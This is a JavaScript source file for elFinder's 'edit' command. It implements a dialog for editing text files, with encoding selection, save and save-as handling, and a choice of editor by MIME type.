/**
 * @class elFinder command "edit". 
 * Edit text file in dialog window
 *
 * @author Dmitry (dio) Levashov, dio@std42.ru
 **/
 elFinder.prototype.commands.edit = function() {
	"use strict";
	var self  = this,
		fm    = this.fm,
		clsEditing = fm.res('class', 'editing'),
		mimesSingle = [],
		mimes = [],
		allowAll = false,
		rtrim = function(str){
			return str.replace(/\s+$/, '');
		},
		getEncSelect = function(heads) {
			var sel = jQuery('<select class="ui-corner-all"></select>'),
				hval;
			if (heads) {
				jQuery.each(heads, function(i, head) {
					hval = fm.escape(head.value);
					sel.append('<option value="'+hval+'">'+(head.caption? fm.escape(head.caption) : hval)+'</option>');
				});
			}
			jQuery.each(self.options.encodings, function(i, v) {
				sel.append('<option value="'+v+'">'+v+'</option>');
			});
			return sel;
		},
		getDlgWidth = function() {
			var win = fm.options.dialogContained? fm.getUI() : jQuery(window),
				m, width;
			if (typeof self.options.dialogWidth === 'string' && (m = self.options.dialogWidth.match(/(\d+)%/))) {
				width = parseInt(win.width() * (m[1] / 100));
			} else {
				width = parseInt(self.options.dialogWidth || 650);
			}
			return Math.min(width, win.width());
		},
		getDlgHeight = function() {
			if (!self.options.dialogHeight) {
				return void(0);
			}
			var win = fm.options.dialogContained? fm.getUI() : jQuery(window),
				m, height;
			if (typeof self.options.dialogHeight === 'string' && (m = self.options.dialogHeight.match(/(\d+)%/))) {
				height = parseInt(win.height() * (m[1] / 100));
			} else {
				height = parseInt(self.options.dialogHeight || win.height());
			}
			return Math.min(height, win.height());
		},

		/**
		 * Return files acceptable to edit
		 *
		 * @param  Array  files hashes
		 * @return Array
		 **/
		filter = function(files) {
			var cnt = files.length,
				mime, ext, skip;
			
			if (cnt > 1) {
				mime = files[0].mime;
				ext = files[0].name.replace(/^.*(\.[^.]+)$/, '$1');
			}
			return jQuery.grep(files, function(file) {
				var res;
				if (skip || file.mime === 'directory') {
					return false;
				}
				res = file.read
					&& (allowAll || fm.mimeIsText(file.mime) || jQuery.inArray(file.mime, cnt === 1? mimesSingle : mimes) !== -1) 
					&& (!self.onlyMimes.length || jQuery.inArray(file.mime, self.onlyMimes) !== -1)
					&& (cnt === 1 || (file.mime === mime && file.name.substr(ext.length * -1) === ext))
					&& (fm.uploadMimeCheck(file.mime, file.phash)? true : false)
					&& setEditors(file, cnt)
					&& Object.keys(editors).length;
				if (!res) {
					skip = true;
				}
				return res;
			});
		},

		fileSync = function(hash) {
			var old = fm.file(hash),
				f;
			fm.request({
				cmd: 'info',
				targets: [hash],
				preventDefault: true
			}).done(function(data) {
				var changed;
				if (data && data.files && data.files.length) {
					f = data.files[0];
					if (old.ts != f.ts || old.size != f.size) {
						changed = { changed: [ f ] };
						fm.updateCache(changed);
						fm.change(changed);
					}
				}
			});
		},

		/**
		 * Open dialog with textarea to edit file
		 *
		 * @param  String  id       dialog id
		 * @param  Object  file     file object
		 * @param  String  content  file content
		 * @return jQuery.Deferred
		 **/
		dialog = function(id, file, content, encoding, editor, toasts) {

			var dfrd = jQuery.Deferred(),
				_loaded = false,
				loaded = function() {
					if (!_loaded) {
						fm.toast({
							mode: 'warning',
							msg: fm.i18n('nowLoading')
						});
						return false;
					}
					return true;
				},
				makeToasts = function() {
					// make toast message
					if (toasts && Array.isArray(toasts)) {
						jQuery.each(toasts, function() {
							this.msg && fm.toast(this);
						});
					}
				},
				save = function() {
					var encord = selEncoding? selEncoding.val():void(0),
						saveDfd = jQuery.Deferred().fail(function(err) {
							dialogNode.show().find('button.elfinder-btncnt-0,button.elfinder-btncnt-1').hide();
						}),
						conf, res, tm;
					if (!loaded()) {
						return saveDfd.resolve();
					}
					if (ta.editor) {
						ta.editor.save(ta[0], ta.editor.instance);
						conf = ta.editor.confObj;
						if (conf.info && (conf.info.schemeContent || conf.info.arrayBufferContent)) {
							encord = 'scheme';
						}
					}
					res = getContent();
					setOld(res);
					if (res.promise) {
						tm = setTimeout(function() {
							fm.notify({
								type : 'chkcontent',
								cnt : 1,
								hideCnt: true,
								cancel : function() {
									res.reject();
								}
							});
						}, 100);
						res.always(function() {
							tm && clearTimeout(tm);
							fm.notify({ type : 'chkcontent', cnt: -1 });
						}).done(function(data) {
							dfrd.notifyWith(ta, [encord, ta.data('hash'), old, saveDfd]);
						}).fail(function(err) {
							saveDfd.reject(err);
						});
					} else {
						dfrd.notifyWith(ta, [encord, ta.data('hash'), old, saveDfd]);
					}
					return saveDfd;
				},
				saveon = function() {
					if (!loaded()) { return; }
					save().fail(function(err) {
						err && fm.error(err);
					});
				},
				cancel = function() {
					ta.elfinderdialog('close');
				},
				savecl = function() {
					if (!loaded()) { return; }
					dialogNode.hide();
					save().done(function() {
						_loaded = false;
						dialogNode.show();
						cancel();
					}).fail(function(err) {
						dialogNode.show();
						err && fm.error(err);
					});
				},
				saveAs = function() {
					if (!loaded()) { return; }
					var prevOld = old,
						phash = file.phash,
						fail = function(err) {
							dialogs.addClass(clsEditing).fadeIn(function() {
								err && fm.error(err);
							});
							old = prevOld;
							fm.disable();
						},
						make = function() {
							self.mime = saveAsFile.mime || file.mime;
							self.prefix = (saveAsFile.name || file.name).replace(/ \d+(\.[^.]+)?$/, '$1');
							self.requestCmd = 'mkfile';
							self.nextAction = {};
							self.data = {target : phash};
							jQuery.proxy(fm.res('mixin', 'make'), self)()
								.done(function(data) {
									var oldHash;
									if (data.added && data.added.length) {
										oldHash = ta.data('hash');
										ta.data('hash', data.added[0].hash);
										save().done(function() {
											_loaded = false;
											dialogNode.show();
											cancel();
											dialogs.fadeIn();
										}).fail(function() {
											fm.exec('rm', [data.added[0].hash], { forceRm: true, quiet: true });
											ta.data('hash', oldHash);
											dialogNode.find('button.elfinder-btncnt-2').hide();
											fail();
										});
									} else {
										fail();
									}
								})
								.progress(function(err) {
									if (err && err === 'errUploadMime') {
										ta.trigger('saveAsFail');
									}
								})
								.fail(fail)
								.always(function() {
									delete self.mime;
									delete self.prefix;
									delete self.nextAction;
									delete self.data;
								});
							fm.trigger('unselectfiles', { files: [ file.hash ] });
						},
						reqOpen = null,
						reqInfo = null,
						dialogs = fm.getUI().children('.' + self.dialogClass + ':visible');
						if (dialogNode.is(':hidden')) {
							dialogs = dialogs.add(dialogNode);
						}
						dialogs.removeClass(clsEditing).fadeOut();
					
					fm.enable();
					
					if (fm.searchStatus.state < 2 && phash !== fm.cwd().hash) {
						reqOpen = fm.exec('open', [phash], {thash: phash});
					} else if (!fm.file(phash)) {
						reqInfo = fm.request({cmd: 'info', targets: [phash]}); 
					}
					
					jQuery.when([reqOpen, reqInfo]).done(function() {
						if (reqInfo) {
							fm.one('infodone', function() {
								fm.file(phash)? make() : fail('errFolderNotFound');
							});
						} else {
							reqOpen? fm.one('cwdrender', make) : make();
						}
					}).fail(fail);
				},
				changed = function() {
					var dfd = jQuery.Deferred(),
						res, tm;
					if (!_loaded) {
						return dfd.resolve(false);
					}
					ta.editor && ta.editor.save(ta[0], ta.editor.instance);
					res = getContent();
					if (res && res.promise) {
						tm = setTimeout(function() {
							fm.notify({
								type : 'chkcontent',
								cnt : 1,
								hideCnt: true,
								cancel : function() {
									res.reject();
								}
							});
						}, 100);
						res.always(function() {
							tm && clearTimeout(tm);
							fm.notify({ type : 'chkcontent', cnt: -1 });
						}).done(function(d) {
							dfd.resolve(old !== d);
						}).fail(function(err) {
							dfd.resolve(err || (old === undefined? false : true));
						});
					} else {
						dfd.resolve(old !== res);
					}
					return dfd;
				},
				opts = {
					title   : fm.escape(file.name),
					width   : getDlgWidth(),
					height  : getDlgHeight(),
					buttons : {},
					cssClass  : clsEditing,
					maxWidth  : 'window',
					maxHeight : 'window',
					allowMinimize : true,
					allowMaximize : true,
					openMaximized : editorMaximized() || (editor && editor.info && editor.info.openMaximized),
					btnHoverFocus : false,
					closeOnEscape : false,
					propagationEvents : ['mousemove', 'mouseup', 'click'],
					minimize : function() {
						var conf;
						if (ta.editor && dialogNode.closest('.ui-dialog').is(':hidden')) {
							conf = ta.editor.confObj;
							if (conf.info && conf.info.syncInterval) {
								fileSync(file.hash);
							}
						}
					},
					close   : function() {
						var close = function() {
								var conf;
								dfrd.resolve();
								if (ta.editor) {
									ta.editor.close(ta[0], ta.editor.instance);
									conf = ta.editor.confObj;
									if (conf.info && conf.info.syncInterval) {
										fileSync(file.hash);
									}
								}
								ta.elfinderdialog('destroy');
							},
							onlySaveAs = (typeof saveAsFile.name !== 'undefined'),
							accept = onlySaveAs? {
								label    : 'btnSaveAs',
								callback : function() {
									requestAnimationFrame(saveAs);
								}
							} : {
								label    : 'btnSaveClose',
								callback : function() {
									save().done(function() {
										close();
									});
								}
							};
						changed().done(function(change) {
							var msgs = ['confirmNotSave'];
							if (change) {
								if (typeof change === 'string') {
									msgs.unshift(change);
								}
								fm.confirm({
									title  : self.title,
									text   : msgs,
									accept : accept,
									cancel : {
										label    : 'btnClose',
										callback : close
									},
									buttons : onlySaveAs? null : [{
										label    : 'btnSaveAs',
										callback : function() {
											requestAnimationFrame(saveAs);
										}
									}]
								});
							} else {
								close();
							}
						});
					},
					open    : function() {
						var loadRes, conf, interval;
						ta.initEditArea.call(ta, id, file, content, fm);
						if (ta.editor) {
							loadRes = ta.editor.load(ta[0]) || null;
							if (loadRes && loadRes.done) {
								loadRes.always(function() {
									_loaded = true;
								}).done(function(instance) {
									ta.editor.instance = instance;
									ta.editor.focus(ta[0], ta.editor.instance);
									setOld(getContent());
									requestAnimationFrame(function() {
										dialogNode.trigger('resize');
									});
								}).fail(function(error) {
									error && fm.error(error);
									ta.elfinderdialog('destroy');
									return;
								}).always(makeToasts);
							} else {
								_loaded = true;
								if (loadRes && (typeof loadRes === 'string' || Array.isArray(loadRes))) {
									fm.error(loadRes);
									ta.elfinderdialog('destroy');
									return;
								}
								ta.editor.instance = loadRes;
								ta.editor.focus(ta[0], ta.editor.instance);
								setOld(getContent());
								requestAnimationFrame(function() {
									dialogNode.trigger('resize');
								});
								makeToasts();
							}
							conf = ta.editor.confObj;
							if (conf.info && conf.info.syncInterval) {
								if (interval = parseInt(conf.info.syncInterval)) {
									setTimeout(function() {
										autoSync(interval);
									}, interval);
								}
							}
						} else {
							_loaded = true;
							setOld(getContent());
						}
					},
					resize : function(e, data) {
						ta.editor && ta.editor.resize(ta[0], ta.editor.instance, e, data || {});
					}
				},
				getContent = function() {
					var res = ta.getContent.call(ta, ta[0]);
					if (res === undefined || res === false || res === null) {
						res = jQuery.Deferred().reject();
					}
					return res;
				},
				setOld = function(res) {
					if (res && res.promise) {
						res.done(function(d) {
							old = d;
						});
					} else {
						old = res;
					}
				},
				autoSync = function(interval) {
					if (dialogNode.is(':visible')) {
						fileSync(file.hash);
						setTimeout(function() {
							autoSync(interval);
						}, interval);
					}
				},
				stateChange = function() {
					if (selEncoding) {
						changed().done(function(change) {
							if (change) {
								selEncoding.attr('title', fm.i18n('saveAsEncoding')).addClass('elfinder-edit-changed');
							} else {
								selEncoding.attr('title', fm.i18n('openAsEncoding')).removeClass('elfinder-edit-changed');
							}
						});
					}
				},
				saveAsFile = {},
				ta, old, dialogNode, selEncoding, extEditor, maxW, syncInterval;
				
			if (editor) {
				if (editor.html) {
					ta = jQuery(editor.html);
				}
				extEditor = {
					init     : editor.init || null,
					load     : editor.load,
					getContent : editor.getContent || null,
					save     : editor.save,
					beforeclose : typeof editor.beforeclose == 'function' ? editor.beforeclose : void 0,
					close    : typeof editor.close == 'function' ? editor.close : function() {},
					focus    : typeof editor.focus == 'function' ? editor.focus : function() {},
					resize   : typeof editor.resize == 'function' ? editor.resize : function() {},
					instance : null,
					doSave   : saveon,
					doCancel : cancel,
					doClose  : savecl,
					file     : file,
					fm       : fm,
					confObj  : editor,
					trigger  : function(evName, data) {
						fm.trigger('editEditor' + evName, Object.assign({}, editor.info || {}, data));
					}
				};
			}
			
			if (!ta) {
				if (!fm.mimeIsText(file.mime)) {
					return dfrd.reject('errEditorNotFound');
				}
				(function() {
					ta = jQuery('<textarea class="elfinder-file-edit" rows="20" id="'+id+'-ta"></textarea>')
						.on('input propertychange', stateChange);
					
					if (!editor || !editor.info || editor.info.useTextAreaEvent) {
						ta.on('keydown', function(e) {
							var code = e.keyCode,
								value, start;
							
							e.stopPropagation();
							if (code == jQuery.ui.keyCode.TAB) {
								e.preventDefault();
								// insert tab on tab press
								if (this.setSelectionRange) {
									value = this.value;
									start = this.selectionStart;
									this.value = value.substr(0, start) + "\t" + value.substr(this.selectionEnd);
									start += 1;
									this.setSelectionRange(start, start);
								}
							}
							
							if (e.ctrlKey || e.metaKey) {
								// close on ctrl+w/q
								if (code == 'Q'.charCodeAt(0) || code == 'W'.charCodeAt(0)) {
									e.preventDefault();
									cancel();
								}
								if (code == 'S'.charCodeAt(0)) {
									e.preventDefault();
									saveon();
								}
							}
							
						})
						.on('mouseenter', function(){this.focus();});
					}

					ta.initEditArea = function(id, file, content) {
						// ta.hide() for performance tune. Need ta.show() in `load()` if use textarea node.
						ta.hide().val(content);
						this._setupSelEncoding(content);
					};
				})();
			}

			// extended function to setup selector of encoding for text editor
			ta._setupSelEncoding = function(content) {
				var heads = (encoding && encoding !== 'unknown')? [{value: encoding}] : [],
					wfake = jQuery('<select></select>').hide(),
					setSelW = function(init) {
						init && wfake.appendTo(selEncoding.parent());
						wfake.empty().append(jQuery('<option></option>').text(selEncoding.val()));
						selEncoding.width(wfake.width());
					};
				if (content === '' || ! encoding || encoding !== 'UTF-8') {
					heads.push({value: 'UTF-8'});
				}
				selEncoding = getEncSelect(heads).on('touchstart', function(e) {
					// for touch punch event handler
					e.stopPropagation();
				}).on('change', function() {
					// reload to change encoding if not edited
					changed().done(function(change) {
						if (! change && getContent() !== '') {
							cancel();
							edit(file, selEncoding.val(), editor).fail(function(err) { err && fm.error(err); });
						}
					});
					setSelW();
				}).on('mouseover', stateChange);
				ta.parent().next().prepend(jQuery('<div class="ui-dialog-buttonset elfinder-edit-extras"></div>').append(selEncoding));
				setSelW(true);
			};

			ta.data('hash', file.hash);
			
			if (extEditor) {
				ta.editor = extEditor;
				
				if (typeof extEditor.beforeclose === 'function') {
					opts.beforeclose = function() {
						return extEditor.beforeclose(ta[0], extEditor.instance);
					};
				}
				
				if (typeof extEditor.init === 'function') {
					ta.initEditArea = extEditor.init;
				}
				
				if (typeof extEditor.getContent === 'function') {
					ta.getContent = extEditor.getContent;
				}
			}
			
			if (! ta.initEditArea) {
				ta.initEditArea = function() {};
			}
			
			if (! ta.getContent) {
				ta.getContent = function() {
					return rtrim(ta.val());
				};
			}
			
			if (!editor || !editor.info || !editor.info.preventGet) {
				opts.buttons[fm.i18n('btnSave')]      = saveon;
				opts.buttons[fm.i18n('btnSaveClose')] = savecl;
				opts.buttons[fm.i18n('btnSaveAs')]    = saveAs;
				opts.buttons[fm.i18n('btnCancel')]    = cancel;
			}
			
			if (editor && typeof editor.prepare === 'function') {
				editor.prepare(ta, opts, file);
			}
			
			dialogNode = self.fmDialog(ta, opts)
				.attr('id', id)
				.on('keydown keyup keypress', function(e) {
					e.stopPropagation();
				})
				.css({ overflow: 'hidden', minHeight: '7em' })
				.addClass('elfinder-edit-editor')
				.closest('.ui-dialog')
				.on('changeType', function(e, data) {
					if (data.extention && data.mime) {
						var ext = data.extention,
							mime = data.mime,
							btnSet = jQuery(this).children('.ui-dialog-buttonpane').children('.ui-dialog-buttonset');
						btnSet.children('.elfinder-btncnt-0,.elfinder-btncnt-1').hide();
						saveAsFile.name = fm.splitFileExtention(file.name)[0] + '.' + data.extention;
						saveAsFile.mime = data.mime;
						if (!data.keepEditor) {
							btnSet.children('.elfinder-btncnt-2').trigger('click');
						}
					}
				});
			
			// care to viewport scale change with mobile devices
			maxW = (fm.options.dialogContained? fm.getUI() : jQuery(window)).width();
			(dialogNode.width() > maxW) && dialogNode.width(maxW);
			
			return dfrd.promise();
		},
		
		/**
		 * Get file content and
		 * open dialog with textarea to edit file content
		 *
		 * @param  String  file hash
		 * @return jQuery.Deferred
		 **/
		edit = function(file, convert, editor) {
			var hash   = file.hash,
				opts   = fm.options,
				dfrd   = jQuery.Deferred(), 
				id     = 'edit-'+fm.namespace+'-'+file.hash,
				d      = fm.getUI().find('#'+id),
				conv   = !convert? 0 : convert,
				noContent = false,
				req, error, res;
			
			
			if (d.length) {
				d.elfinderdialog('toTop');
				return dfrd.resolve();
			}
			
			if (!file.read || (!file.write && (!editor.info || !editor.info.converter))) {
				error = ['errOpen', file.name, 'errPerm'];
				return dfrd.reject(error);
			}
			
			if (editor && editor.info) {
				if (typeof editor.info.edit === 'function') {
					res = editor.info.edit.call(fm, file, editor);
					if (res.promise) {
						res.done(function() {
							dfrd.resolve();
						}).fail(function(error) {
							dfrd.reject(error);
						});
					} else {
						res? dfrd.resolve() : dfrd.reject();
					}
					return dfrd;
				}

				noContent = editor.info.preventGet || editor.info.noContent;
				if (editor.info.urlAsContent || noContent) {
					req = jQuery.Deferred();
					if (editor.info.urlAsContent) {
						fm.url(hash, { async: true, onetime: true, temporary: true }).done(function(url) {
							req.resolve({content: url});
						});
					} else {
						req.resolve({});
					}
				} else {
					if (conv) {
						file.encoding = conv;
						fm.cache(file, 'change');
					}
					req = fm.request({
						data           : {cmd : 'get', target : hash, conv : conv, _t : file.ts},
						options        : {type: 'get', cache : true},
						notify         : {type : 'file', cnt : 1},
						preventDefault : true
					});
				}

				req.done(function(data) {
					var selEncoding, reg, m, res;
					if (data.doconv) {
						fm.confirm({
							title  : self.title,
							text   : data.doconv === 'unknown'? 'confirmNonUTF8' : 'confirmConvUTF8',
							accept : {
								label    : 'btnConv',
								callback : function() {  
									dfrd = edit(file, selEncoding.val(), editor);
								}
							},
							cancel : {
								label    : 'btnCancel',
								callback : function() { dfrd.reject(); }
							},
							optionsCallback : function(options) {
								options.create = function() {
									var base = jQuery('<div class="elfinder-dialog-confirm-encoding"></div>'),
										head = {value: data.doconv},
										detected;
									
									if (data.doconv === 'unknown') {
										head.caption = '-';
									}
									selEncoding = getEncSelect([head]);
									jQuery(this).next().find('.ui-dialog-buttonset')
										.prepend(base.append(jQuery('<label>'+fm.i18n('encoding')+' </label>').append(selEncoding)));
								};
							}
						});
					} else {
						if (!noContent && fm.mimeIsText(file.mime)) {
							reg = new RegExp('^(data:'+file.mime.replace(/([.+])/g, '\\$1')+';base64,)', 'i');
							if (!editor.info.dataScheme) {
								if (window.atob && (m = data.content.match(reg))) {
									data.content = atob(data.content.substr(m[1].length));
								}
							} else {
								if (window.btoa && !data.content.match(reg)) {
									data.content = 'data:'+file.mime+';base64,'+btoa(data.content);
								}
							}
						}
						dialog(id, file, data.content, data.encoding, editor, data.toasts)
							.done(function(data) {
								dfrd.resolve(data);
							})
							.progress(function(encoding, newHash, data, saveDfd) {
								var ta = this;
								if (newHash) {
									hash = newHash;
								}
								fm.request({
									options : {type : 'post'},
									data : {
										cmd     : 'put',
										target  : hash,
										encoding : encoding || data.encoding,
										content : data
									},
									notify : {type : 'save', cnt : 1},
									syncOnFail : true,
									preventFail : true,
									navigate : {
										target : 'changed',
										toast : {
											inbuffer : {msg: fm.i18n(['complete', fm.i18n('btnSave')])}
										}
									}
								})
								.fail(function(error) {
									dfrd.reject(error);
									saveDfd.reject();
								})
								.done(function(data) {
									requestAnimationFrame(function(){
										ta.trigger('focus');
										ta.editor && ta.editor.focus(ta[0], ta.editor.instance);
									});
									saveDfd.resolve();
								});
							})
							.fail(function(error) {
								dfrd.reject(error);
							});
					}
				})
				.fail(function(error) {
					var err = fm.parseError(error);
					err = Array.isArray(err)? err[0] : err;
					if (file.encoding) {
						file.encoding = '';
						fm.cache(file, 'change');
					}
					(err !== 'errConvUTF8') && fm.sync();
					dfrd.reject(error);
				});
			}

			return dfrd.promise();
		},
		
		/**
		 * Current editors of selected files
		 * 
		 * @type Object
		 */
		editors = {},
		
		/**
		 * Fallback editor (Simple text editor)
		 * 
		 * @type Object
		 */
		fallbackEditor = {
			// Simple Text (basic textarea editor)
			info : {
				id : 'textarea',
				name : 'TextArea',
				useTextAreaEvent : true
			},
			load : function(textarea) {
				// trigger event 'editEditorPrepare'
				this.trigger('Prepare', {
					node: textarea,
					editorObj: void(0),
					instance: void(0),
					opts: {}
				});
				textarea.setSelectionRange && textarea.setSelectionRange(0, 0);
				jQuery(textarea).trigger('focus').show();
			},
			save : function(){}
		},

		/**
		 * Set current editors
		 * 
		 * @param  Object  file object
		 * @param  Number  cnt  count of selected items
		 * @return Void
		 */
		setEditors = function(file, cnt) {
			var mimeMatch = function(fileMime, editorMimes){
					if (!editorMimes) {
						return fm.mimeIsText(fileMime);
					} else {
						if (editorMimes[0] === '*' || jQuery.inArray(fileMime, editorMimes) !== -1) {
							return true;
						}
						var i, l;
						l = editorMimes.length;
						for (i = 0; i < l; i++) {
							if (fileMime.indexOf(editorMimes[i]) === 0) {
								return true;
							}
						}
						return false;
					}
				},
				extMatch = function(fileName, editorExts){
					if (!editorExts || !editorExts.length) {
						return true;
					}
					var ext = fileName.replace(/^.+\.([^.]+)|(.+)$/, '$1$2').toLowerCase(),
					i, l;
					l = editorExts.length;
					for (i = 0; i < l; i++) {
						if (ext === editorExts[i].toLowerCase()) {
							return true;
						}
					}
					return false;
				},
				optEditors = self.options.editors || [],
				cwdWrite = fm.cwd().write;
			
			stored = fm.storage('storedEditors') || {};
			editors = {};
			if (!optEditors.length) {
				optEditors = [fallbackEditor];
			}
			jQuery.each(optEditors, function(i, editor) {
				var name;
				if ((cnt === 1 || !editor.info.single)
						&& ((!editor.info || !editor.info.converter)? file.write : cwdWrite)
						&& (file.size > 0 || (!editor.info.converter && editor.info.canMakeEmpty !== false && fm.mimesCanMakeEmpty[file.mime]))
						&& (!editor.info.maxSize || file.size <= editor.info.maxSize)
						&& mimeMatch(file.mime, editor.mimes || null)
						&& extMatch(file.name, editor.exts || null)
						&& typeof editor.load == 'function'
						&& typeof editor.save == 'function') {
					
					name = editor.info.name? editor.info.name : ('Editor ');
					editor.id = editor.info.id? editor.info.id : ('editor' + i),
					editor.name = name;
					editor.i18n = fm.i18n(name);
					editors[editor.id] = editor;
				}
			});
			return Object.keys(editors).length? true : false;
		},
		store = function(mime, editor) {
			if (mime && editor) {
				if (!jQuery.isPlainObject(stored)) {
					stored = {};
				}
				stored[mime] = editor.id;
				fm.storage('storedEditors', stored);
				fm.trigger('selectfiles', {files : fm.selected()});
			}
		},
		useStoredEditor = function() {
			var d = fm.storage('useStoredEditor');
			return d? (d > 0) : self.options.useStoredEditor;
		},
		editorMaximized = function() {
			var d = fm.storage('editorMaximized');
			return d? (d > 0) : self.options.editorMaximized;
		},
		getSubMenuRaw = function(files, callback) {
			var subMenuRaw = [];
			jQuery.each(editors, function(id, ed) {
				subMenuRaw.push(
					{
						label    : fm.escape(ed.i18n),
						icon     : ed.info && ed.info.icon? ed.info.icon : 'edit',
						options  : { iconImg: ed.info && ed.info.iconImg? fm.baseUrl + ed.info.iconImg : void(0) },
						callback : function() {
							store(files[0].mime, ed);
							callback && callback.call(ed);
						}
					}		
				);
			});
			return subMenuRaw;
		},
		getStoreId = function(name) {
			// for compatibility to previous version
			return name.toLowerCase().replace(/ +/g, '');
		},
		getStoredEditor = function(mime) {
			var name = stored[mime];
			return name && Object.keys(editors).length? editors[getStoreId(name)] : void(0);
		},
		infoRequest = function() {

		},
		stored;
	
	// make public method
	this.getEncSelect = getEncSelect;

	this.shortcuts = [{
		pattern     : 'ctrl+e'
	}];
	
	this.init = function() {
		var self = this,
			fm   = this.fm,
			opts = this.options,
			cmdChecks = [],
			ccData, dfd;
		
		this.onlyMimes = this.options.mimes || [];
		
		fm.one('open', function() {
			// editors setup
			if (opts.editors && Array.isArray(opts.editors)) {
				fm.trigger('canMakeEmptyFile', {mimes: Object.keys(fm.storage('mkfileTextMimes') || {}).concat(opts.makeTextMimes || ['text/plain'])});
				jQuery.each(opts.editors, function(i, editor) {
					if (editor.info && editor.info.cmdCheck) {
						cmdChecks.push(editor.info.cmdCheck);
					}
				});
				if (cmdChecks.length) {
					if (fm.api >= 2.1030) {
						dfd = fm.request({
							data : {
								cmd: 'editor',
								name: cmdChecks,
								method: 'enabled'
							},
							preventDefault : true
						}).done(function(d) {
							ccData = d;
						}).fail(function() {
							ccData = {};
						});
					} else {
						ccData = {};
						dfd = jQuery.Deferred().resolve();
					}
				} else {
					dfd = jQuery.Deferred().resolve();
				}
				
				dfd.always(function() {
					if (ccData) {
						opts.editors = jQuery.grep(opts.editors, function(e) {
							if (e.info && e.info.cmdCheck) {
								return ccData[e.info.cmdCheck]? true : false;
							} else {
								return true;
							}
						});
					}
					jQuery.each(opts.editors, function(i, editor) {
						if (editor.setup && typeof editor.setup === 'function') {
							editor.setup.call(editor, opts, fm);
						}
						if (!editor.disabled) {
							if (editor.mimes && Array.isArray(editor.mimes)) {
								mimesSingle = mimesSingle.concat(editor.mimes);
								if (!editor.info || !editor.info.single) {
									mimes = mimes.concat(editor.mimes);
								}
							}
							if (!allowAll && editor.mimes && editor.mimes[0] === '*') {
								allowAll = true;
							}
							if (!editor.info) {
								editor.info = {};
							}
							if (editor.info.integrate) {
								fm.trigger('helpIntegration', Object.assign({cmd: 'edit'}, editor.info.integrate));
							}
							if (editor.info.canMakeEmpty) {
								fm.trigger('canMakeEmptyFile', {mimes: Array.isArray(editor.info.canMakeEmpty)? editor.info.canMakeEmpty : editor.mimes});
							}
						}
					});
					
					mimesSingle = (jQuery.uniqueSort || jQuery.unique)(mimesSingle);
					mimes = (jQuery.uniqueSort || jQuery.unique)(mimes);
					
					opts.editors = jQuery.grep(opts.editors, function(e) {
						return e.disabled? false : true;
					});
				});
			}
		})
		.bind('select', function() {
			editors = null;
		})
		.bind('contextmenucreate', function(e) {
			var file, editor,
				single = function(editor) {
					var title = self.title;
					fm.one('contextmenucreatedone', function() {
						self.title = title;
					});
					self.title = fm.escape(editor.i18n);
					if (editor.info && editor.info.iconImg) {
						self.contextmenuOpts = {
							iconImg: fm.baseUrl + editor.info.iconImg
						};
					}
					delete self.variants;
				};
			
			self.contextmenuOpts = void(0);
			if (e.data.type === 'files' && self.enabled()) {
				file = fm.file(e.data.targets[0]);
				if (setEditors(file, e.data.targets.length)) {
					if (Object.keys(editors).length > 1) {
						if (!useStoredEditor() || !(editor = getStoredEditor(file.mime))) {
							delete self.extra;
							self.variants = [];
							jQuery.each(editors, function(id, editor) {
								self.variants.push([{ editor: editor }, editor.i18n, editor.info && editor.info.iconImg? fm.baseUrl + editor.info.iconImg : 'edit']);
							});
						} else {
							single(editor);
							self.extra = {
								icon: 'menu',
								node: jQuery('<span></span>')
									.attr({title: fm.i18n('select')})
									.on('click touchstart', function(e){
										if (e.type === 'touchstart' && e.originalEvent.touches.length > 1) {
											return;
										}
										var node = jQuery(this);
										e.stopPropagation();
										e.preventDefault();
										fm.trigger('contextmenu', {
											raw: getSubMenuRaw(fm.selectedFiles(), function() {
												var hashes = fm.selected();
												fm.exec('edit', hashes, {editor: this});
												fm.trigger('selectfiles', {files : hashes});
											}),
											x: node.offset().left,
											y: node.offset().top
										});
									})
							};
						}
					} else {
						single(editors[Object.keys(editors)[0]]);
						delete self.extra;
					}
				}
			}
		})
		.bind('canMakeEmptyFile', function(e) {
			if (e.data && e.data.resetTexts) {
				var defs = fm.arrayFlip(self.options.makeTextMimes || ['text/plain']),
					hides = self.getMkfileHides();

				jQuery.each((fm.storage('mkfileTextMimes') || {}), function(mime, type) {
					if (!defs[mime]) {
						delete fm.mimesCanMakeEmpty[mime];
						delete hides[mime];
					}
				});
				fm.storage('mkfileTextMimes', null);
				if (Object.keys(hides).length) {
					fm.storage('mkfileHides', hides);
				} else {
					fm.storage('mkfileHides', null);
				}
			}
		});
	};
	
	this.getstate = function(select) {
		var sel = this.files(select),
			cnt = sel.length;

		return cnt && filter(sel).length == cnt ? 0 : -1;
	};
	
	this.exec = function(select, opts) {
		var fm    = this.fm, 
			files = filter(this.files(select)),
			hashes = jQuery.map(files, function(f) { return f.hash; }),
			list  = [],
			editor = opts && opts.editor? opts.editor : null,
			node = jQuery(opts && opts._currentNode? opts._currentNode : fm.cwdHash2Elm(hashes[0])),
			getEditor = function() {
				var dfd = jQuery.Deferred(),
					storedId;
				
				if (!editor && Object.keys(editors).length > 1) {
					if (useStoredEditor() && (editor = getStoredEditor(files[0].mime))) {
						return dfd.resolve(editor);
					}
					fm.trigger('contextmenu', {
						raw: getSubMenuRaw(files, function() {
							dfd.resolve(this);
						}),
						x: node.offset().left,
						y: node.offset().top + 22,
						opened: function() {
							fm.one('closecontextmenu',function() {
								requestAnimationFrame(function() {
									if (dfd.state() === 'pending') {
										dfd.reject();
									}
								});
							});
						}
					});
					
					fm.trigger('selectfiles', {files : hashes});
					
					return dfd;
				} else {
					Object.keys(editors).length > 1 && editor && store(files[0].mime, editor);
					return dfd.resolve(editor? editor : (Object.keys(editors).length? editors[Object.keys(editors)[0]] : null));
				}
			},
			dfrd = jQuery.Deferred(),
			file;

		if (editors === null) {
			setEditors(files[0], hashes.length);
		}
		
		if (!node.length) {
			node = fm.getUI('cwd');
		}
		
		getEditor().done(function(editor) {
			while ((file = files.shift())) {
				list.push(edit(file, (file.encoding || void(0)), editor).fail(function(error) {
					error && fm.error(error);
				}));
			}
			
			if (list.length) { 
				jQuery.when.apply(null, list).done(function() {
					dfrd.resolve();
				}).fail(function() {
					dfrd.reject();
				});
			} else {
				dfrd.reject();
			}
		}).fail(function() {
			dfrd.reject();
		});
		
		return dfrd;
	};

	this.getMkfileHides = function() {
		return fm.storage('mkfileHides') || fm.arrayFlip(self.options.mkfileHideMimes || []);
	};

};
